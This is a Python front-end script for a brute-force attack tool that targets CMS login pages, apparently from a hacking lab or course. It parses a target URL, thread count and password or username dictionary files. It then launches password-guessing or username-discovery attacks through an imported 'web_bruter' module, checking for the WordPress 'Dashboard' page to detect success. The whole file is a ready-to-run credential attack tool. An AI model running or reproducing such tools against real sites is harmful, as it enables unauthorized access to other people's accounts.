import sys
import web_bruter
from optparse import OptionParser


def get_arguments():
    parser = OptionParser()
    parser.add_option("-t", "--target", dest="target_url",
            help="target url where the login form is ")
    parser.add_option("-u", "--username", dest="username",
            help="set the ip of the gateway ")
    parser.add_option("-j", "--jobs", dest="user_thread",
            help="number of parallel threads to launch ")
    parser.add_option("-c", "--cms", dest="cms",
            help="which CMS do you attack: joomla, wordpress (default = wordpress)")
    parser.add_option("-f", "--password_file", dest="password_dictionary",
            help="dictionary file where are stored the passwords to bruteforce")
    parser.add_option("-F", "--user_file", dest="username_dictionary",
            help="dictionary file where are stored the usernames to bruteforce")
    parser.add_option("-m", "--mode", dest="mode",
            help="attack mode: password, user (default = password)")
    parser.add_option("-r", "--resume", dest="resume",
            help="From which word to you want to resume the password dictionary from")
    (options, args) = parser.parse_args()
    if not options.target_url:
        print ("[!] Please, provide a target url!")
        exit(1)
    return options

if __name__ == "__main__":

    #Retrieving options
    # general settings
    options = get_arguments()
    mode = options.mode or "password"

    if options.user_thread:
        user_thread = int(options.user_thread) 
    else:
        user_thread = 1

    username = options.username or "admin"
    passwords_file = options.password_dictionary or "./cain.txt"
    usernames_file = options.username_dictionary or "./usernames_dict.txt"
    resume = options.resume or None
    
    # target specific settings
    target_url = options.target_url# or "http://10.0.2.7/wp-login.php"
    target_post = options.target_url# or "http://10.0.2.7/wp-login.php"
    
    username_field= "log"
    password_field= "pwd"
    success_check = "Dashboard"
    
    ##################################3
    #
    # Launching the attack
    #
    ##################################3
    
    
    bruter_obj = web_bruter.Bruter(target_url = target_url,
            username = username, 
            passwords_list = passwords_file , 
            usernames_list = usernames_file , 
            user_threads = int(user_thread),
            resume = resume)

    if mode == 'password':
        print("Running password bruteforce attack!")
        bruter_obj.run_password_bruteforce()

    elif mode == 'user':
        print("Running username discovery attack!")
        print("*********************************************************************")
        print("IT SEEMS THAT THE USER ATTACK DOES NOT WORK IF THERE IS A CAPTCHA!!!!")
        print("*********************************************************************")
        bruter_obj.run_username_bruteforce()
    
        name_list = bruter_obj.get_discovered_usernames()
        print('########################')
        print('List of usernames found:')
        for name in name_list:
            print(name)
